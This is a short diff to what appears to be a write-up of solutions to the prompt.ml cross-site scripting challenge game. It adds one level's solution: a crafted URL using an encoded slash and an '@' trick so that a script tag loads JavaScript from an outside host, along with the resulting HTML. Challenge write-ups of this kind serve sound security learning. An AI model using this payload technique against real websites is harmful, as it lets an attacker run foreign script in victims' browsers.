@@ -144,6 +144,18 @@ function escape(input) {
 }  
 ```
 
+- Solution
+
+```
+https://prompt.ml%2F@rxss.netlify.app/script.js
+```
+
+- HTML Source
+
+```
+<script src="https://prompt.ml%2F@rxss.netlify.app/script.js"></script>
+```
+
 
 ## Level 5
 
